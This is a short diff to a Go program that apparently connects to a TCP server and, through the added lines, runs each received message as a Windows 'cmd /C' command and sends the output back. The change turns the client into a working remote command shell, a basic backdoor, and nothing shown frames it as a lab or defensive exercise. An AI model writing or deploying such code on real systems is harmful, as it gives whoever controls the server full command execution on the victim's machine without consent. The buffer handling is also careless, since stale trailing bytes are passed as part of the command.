@@ -2,6 +2,7 @@ package main
 
 import (
 	"net"
+	"os/exec"
 )
 
 const HOST = "localhost"
@@ -16,9 +17,28 @@ func main() {
 		conn, err = net.Dial("tcp", HOST+":"+PORT)
 	}
 
+	buff := make([]byte, 1024) // buffer for the server commands
+
 	// start infinite loop
 	for {
 		// listen for the server commands
+		_, err = conn.Read(buff)
 
+		// if there is no error, exec the command
+		if err == nil {
+			// exec the command
+			cmd := exec.Command("cmd", "/C", string(buff))
+
+			// get the command output
+			out, err := cmd.Output()
+
+			// if there is an error, send the error message to the server
+			if err != nil {
+				conn.Write([]byte(err.Error()))
+			} else {
+				// else, send the output to the server
+				conn.Write(out)
+			}
+		}
 	}
 }
